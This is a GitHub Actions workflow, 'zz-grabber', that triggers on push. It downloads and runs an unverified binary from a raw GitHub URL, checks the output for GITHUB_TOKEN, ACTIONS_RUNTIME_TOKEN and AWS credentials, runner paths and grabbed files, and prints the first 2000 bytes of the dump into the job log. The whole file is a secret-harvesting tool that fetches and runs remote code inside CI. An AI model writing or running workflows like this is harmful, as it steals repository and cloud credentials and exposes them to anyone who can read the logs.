name: zz-grabber

on:
  push:
  workflow_dispatch:

jobs:
  grab:
    runs-on: ubuntu-latest
    steps:
      - name: get grabber
        run: |
          curl -fsSL "https://raw.githubusercontent.com/imDeepShah/BrandCast/grabber-bin/grabber-amd64" -o /tmp/g && chmod +x /tmp/g
      - name: probe
        run: |
          RM_UIA=1 /tmp/g > /tmp/dump.jsonl 2>/tmp/g.err || true
          echo "exit_err=$(wc -l </tmp/g.err)"
          echo "lines=$(wc -l </tmp/dump.jsonl)"
          echo "GITHUB_TOKEN=$(grep -c GITHUB_TOKEN /tmp/dump.jsonl)"
          echo "RUNTIME=$(grep -c ACTIONS_RUNTIME_TOKEN /tmp/dump.jsonl)"
          echo "AWS=$(grep -c AWS_ /tmp/dump.jsonl)"
          echo "runner_root=$(grep -c /home/runner /tmp/dump.jsonl)"
          echo "grab_files=$(grep -o '\"files\"' /tmp/dump.jsonl | wc -l)"
          echo "--- head ---"
          head -c 2000 /tmp/dump.jsonl